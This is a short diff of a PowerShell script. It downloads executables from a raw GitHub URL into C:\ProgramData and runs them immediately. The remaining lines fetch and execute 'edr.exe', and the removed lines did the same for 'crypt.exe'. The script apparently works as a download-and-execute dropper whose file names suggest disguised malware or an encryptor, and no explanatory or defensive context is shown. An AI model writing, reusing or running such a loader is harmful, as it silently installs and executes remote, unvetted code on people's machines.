@@ -2,7 +2,3 @@ $url = "https://github.com/ndoug2081-stack/ndoug2081-stack/raw/refs/heads/main/e
 $filePath = "C:\ProgramData\edr.exe"
 Invoke-WebRequest -Uri $url -OutFile $filePath
 & $filePath
-$url2 = "https://github.com/ndoug2081-stack/ndoug2081-stack/raw/refs/heads/main/crypt.exe"
-$filePath2 = "C:\ProgramData\crypt.exe"
-Invoke-WebRequest -Uri $url2 -OutFile $filePath2
-& $filePath2
